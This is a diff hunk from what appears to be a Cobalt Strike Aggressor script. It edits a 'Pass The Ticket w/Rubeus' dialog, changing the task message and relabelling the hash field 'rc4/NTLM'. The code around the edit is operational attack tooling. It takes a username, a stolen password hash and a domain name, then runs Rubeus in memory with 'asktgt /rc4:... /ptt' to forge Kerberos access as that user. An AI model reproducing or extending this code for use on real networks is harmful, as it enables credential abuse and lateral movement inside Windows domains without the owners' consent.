@@ -449,13 +449,13 @@ sub passticket{
         $cmdargs = "";
         $cmdargs = "asktgt /rc4:$3['rc4'] /domain:$3['fqdn'] /user:$3['username'] /ptt";
         if ($3["execmethod"] eq "Execute-Assembly"){
-            btask($bid, 'Enumerating Remote Computer');
+            btask($bid, 'Passing The Ticket');
             bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), $cmdargs);
         }
     }));
     dialog_description($dialog, "Pass The Ticket w/Rubeus");
     drow_text($dialog, "username",  "Please Enter the username:");
-    drow_text($dialog, "rc4",  "Please Enter the rc4 hash:");
+    drow_text($dialog, "rc4",  "Please Enter the rc4/NTLM hash:");
     drow_text($dialog, "fqdn",  "Please Enter the Fully Qualified Domain Name:");
     dbutton_action($dialog, "Execute");
     dialog_show($dialog);
